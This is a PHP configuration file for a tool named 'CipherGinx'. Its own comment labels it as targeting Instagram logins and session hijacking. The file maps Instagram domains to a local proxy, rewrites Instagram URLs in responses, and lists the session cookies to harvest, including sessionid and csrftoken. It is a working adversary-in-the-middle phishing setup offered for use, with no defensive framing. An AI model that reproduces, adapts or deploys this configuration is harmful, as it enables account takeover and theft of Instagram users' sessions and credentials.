<?php
// CipherGinx PHP - Instagram Phishing Configuration
// Targets Instagram login and session hijacking

return [
    'hostname' => 'instagram.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['instagram.com', 'localhost'],
        ['www.instagram.com', 'localhost'],
        ['api.instagram.com', 'api.localhost'],
        ['graph.instagram.com', 'graph.localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://instagram.com', 'https://localhost'],
        ['', 'https://www.instagram.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/api/v1/blobs/cluster_batch',
    ],

    'get_cookie' => [
        'sessionid',
        'ig_did',
        'ig_nrcb',
        'csrftoken',
        'ds_user_id',
        'rur',
    ],
];
